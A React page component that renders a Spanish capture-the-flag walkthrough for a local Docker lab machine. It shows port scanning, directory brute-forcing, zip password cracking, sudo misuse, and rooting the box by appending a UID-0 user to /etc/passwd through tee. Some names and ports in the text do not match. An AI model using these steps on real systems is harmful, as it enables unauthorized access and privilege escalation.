import CodeBash from "@/components/CodeBash";
import labs from "../labs";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { ChevronDown,  Slash } from "lucide-react";
import { Link } from "react-router-dom";
import { CopyBlock, dracula } from "react-code-blocks";
function Bashpariencias() {
  const lastPath = location.pathname.split("/").filter(Boolean).pop();
  return (
    <div>
      <Breadcrumb>
        <BreadcrumbList>
          <BreadcrumbItem>
            <Link to="/">Home</Link>
          </BreadcrumbItem>
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <DropdownMenu>
              <DropdownMenuTrigger className="flex items-center gap-1">
                Docker Labs
                <ChevronDown className="h-4 w-4" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start">
                {labs.map((lab) => (
                  <Link
                    to={
                      "/docker-labs/" + lab.toLowerCase().split(" ").join("-")
                    }
                  >
                    <DropdownMenuItem key={lab}>{lab}</DropdownMenuItem>
                  </Link>
                ))}
              </DropdownMenuContent>
            </DropdownMenu>
          </BreadcrumbItem>{" "}
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <BreadcrumbPage className="text-primary">
              {lastPath!.at(0)!.toUpperCase() +
                lastPath!.substring(1).split("-").join(" ")}
            </BreadcrumbPage>
          </BreadcrumbItem>
        </BreadcrumbList>
      </Breadcrumb>
      <div className="flex items-center flex-col">
        <h1 className="text-5xl mt-3 mb-5 font-bold">Bashpariencias</h1>
        <div className="md:px-48 w-full">
          <h2 className="my-2 text-3xl font-bold">
            Comenzamos inicializando la maquina
          </h2>
          <CodeBash text="sudo bash auto_deploy.sh bashpariencias.tar" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Escaneo de puertos</h2>
          <p>Vamos a empezar el escaneo de puertos usando nmap</p>
          <CodeBash text="nmap -p- --open 172.18.0.2 -Pn" />
          <p>De resultado tenemos el puerto 80 y el 21 abiertos</p>
          <CodeBash
            text="PORT     STATE SERVICE
80/tcp   open  http
8899/tcp open  ospf-lite"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Explorando el puerto 80
          </h2>
          <p>
            Se habla de alguien llamada Rosa, quien no guardo bien su
            contraseña, buscaremos mas usando feroxbuster para el ataque de
            navegacion forzada{" "}
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Ataque de navegacion forzada
          </h2>
          <CodeBash text="feroxbuster -u http://172.18.0.2:80 -t 500 -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -g" />
          <p>Encontramos un archivo llamado shell.php</p>
          <CodeBash text="200      GET       46l      184w     1558c http://172.18.0.2/shell.php" />
          <p>
            Al entrar vemos un codigo en php que no nos sirve de nada ya que no
            solo muestra la informacion de lo que enviaria app.html
          </p>
          <p>
            Despues de revisar un rato no encontre ninguna vulnerabilidad en el
            sistema, sin embargo revisando el codigo fuente de form.html
            encontramos la contraseña de Rosa
          </p>
          <div className="my-3 mx-2">
            <CopyBlock
              showLineNumbers={false}
              theme={dracula}
              codeBlock
              language="html"
              text={`<div>
    <h6 class="my-0">Second product</h6>
    <small class="text-muted">Brief description rosa</small>
    <p style="visibility: hidden;">rosa:lacagadenuevo</p>
</div>`}
            />
          </div>
          <p>Nos conectamos con ssh mediante el puerto 8899</p>
          <CodeBash text="ssh rosa@172.18.0.2 -p 8899" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <p>
            Una vez dentro exploramos un poco el ambiente, vemos que existen 2
            usuarios mas: carlos y juan, y aparte un txt con algun mensaje al
            cual no podemos acceder, trate de usar sudo -l pero no tengo
            permisos. Dentro de la carpeta de rosa encontramos una carpeta de
            nombre "-" con mv le cambiamos el nombre a "a"
          </p>
          <CodeBash text="mv - a" />
          <p>
            Dentro de la carpeta vemos un txt donde juan le dice a rosa que su
            contraseña esta en el zip que esta en esa misma carpeta, pero a la
            hora de querer descomprimir el zip este nos pide contraseña, asi que
            lo descargaremos usando scp para crackearlo en nuestra maquina
          </p>
          <CodeBash text="scp -P 8899 rosa@172.18.0.2:/home/rosa/a/ ./" />
          <p>Usamos zip2john para extraer el hash del zip</p>
          <CodeBash text="zip2john backup_rosa.zip > ziphash.txt" />
          <p>Crackeamos el zip usando john</p>
          <CodeBash text="john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt" />
          <p>Y mostramos el resultado con john --show ziphash.txt</p>
          <CodeBash text="backup_rosa.zip/password.txt:123123:password.txt:backup_rosa.zip::backup_rosa.zip" />
          <p>
            Vemos que la contraseña es 123123 y extraemos el zip, contiene un
            txt con la contraseña de juan asi que procedemos a conectarnos a
            juan
          </p>
          <CodeBash text="hackwhitbash" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <p>Nos conectamos por ssh a juan en el puerto 8899</p>
          <CodeBash text="ssh juan@172.18.0.2 -p 8899" />
          <p>Una vez dentro revisamos lo que podemos hacer con</p>
          <CodeBash text="sudo -l" />
          <p>Esta vez si nos dejo ejecutar el comando, este es el resultado</p>
          <CodeBash
            text="User juan may run the following commands on f813247673da:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat"
          />
          <p>
            Revisamos el contenido de la carpeta oscar con privilegios de carlos
          </p>
          <CodeBash text="sudo -u carlos tree /home/carlos/" />
          <p>El resultado es</p>
          <CodeBash
            text={`carlos/
└── password

1 directory, 1 file`}
          />
          <p>
            Vemos que hay un archivo llamado password, como podemos usar cat
            como carlos lo usaremos para ver el contenido de ese archivo
          </p>
          <CodeBash text="LFILE=/home/oscar/password" />
          <CodeBash text='sudo -u oscar cat "$LFILE"' />
          <p>El contenido es</p>
          <CodeBash text="chocolateado" />
          <p>Parece ser la contraseña del usuario carlos en ssh</p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <CodeBash text="ssh carlos@172.18.0.2 -p 8899" />
          <p>Nos conectamos como carlos y revisamos los permisos que tenemos</p>
          <CodeBash text="sudo -l" />
          <p>El resultado es</p>
          <CodeBash
            text="User carlos may run the following commands on f813247673da:
    (ALL : NOPASSWD) /usr/bin/tee"
          />
          <p>
            Con lee podemos escribir archivos con permisos de root, asi que
            crearemos un usuario nuevo con estos permisos
          </p>
          <p>Creamos una contraseña con openssl</p>
          <CodeBash text="openssl passwd 1234" />
          <CodeBash text="$1$IZ3faaMZ$HW44aU0vUpNSJypsK.Jhg/" />
          <p>
            Usamos tee para meter un nuevo usuario con esta contraseña en
            /etc/passwd
          </p>
          <CodeBash text="LFILE=/etc/passwd" />
          <CodeBash
            text={`echo 'newroot:$1$IZ3faaMZ$HW44aU0vUpNSJypsK.Jhg/:0:0::/home/newroot:/bin/bash' | sudo -u root tee -a "$LFILE"`}
          />
          <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
          <CodeBash text="su newroot" />
          <p>
            Escribimos la contraseña que creamos con openssl, en mi caso es 1234
          </p>
          <CodeBash
            text="root@f813247673da:/home# whoami
root
root@f813247673da:/home#"
          />
          <p>Como dato adicional el contenido de megasecret.txt es</p>
          <CodeBash
            text="root@f813247673da:/home# cat megasecret.txt
1234567890"
          />
        </div>
      </div>
    </div>
  );
}

export default Bashpariencias;
